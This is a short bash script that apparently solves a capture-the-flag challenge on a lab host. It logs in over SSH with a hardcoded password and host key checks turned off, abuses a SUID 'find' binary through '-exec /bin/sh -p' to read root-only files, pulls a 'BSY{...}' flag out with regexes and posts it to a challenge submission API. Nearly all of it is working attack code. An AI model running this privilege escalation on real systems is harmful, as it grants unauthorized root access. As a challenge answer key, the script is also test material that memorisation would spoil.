#!/usr/bin/env bash
set -euo pipefail

HOST="172.20.0.141"
USER="frame"
PASSWORD="orbit-7delta"
CHALLENGE_ID="scl-challenge-frame-d0b1b1"

nmap -Pn -p 22 "$HOST" >/dev/null
OUTPUT="$(sshpass -p "$PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  "$USER@$HOST" \
  "find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /root/flag; cat /root/.escalation-proof' \\; -quit")"

printf '%s\n' "$OUTPUT"
FLAG="$(printf '%s\n' "$OUTPUT" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}", sys.stdin.read()); print(m.group(0) if m else "")')"
CANARY="$(printf '%s\n' "$OUTPUT" | python3 -c 'import re,sys; m=re.search(r"[A-Za-z0-9_-]+", sys.stdin.read().splitlines()[-1]); print(m.group(0) if m else "")')"

if [[ -z "$FLAG" || -z "$CANARY" ]]; then
  echo "Could not extract both root artifacts" >&2
  exit 1
fi

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
printf '\n'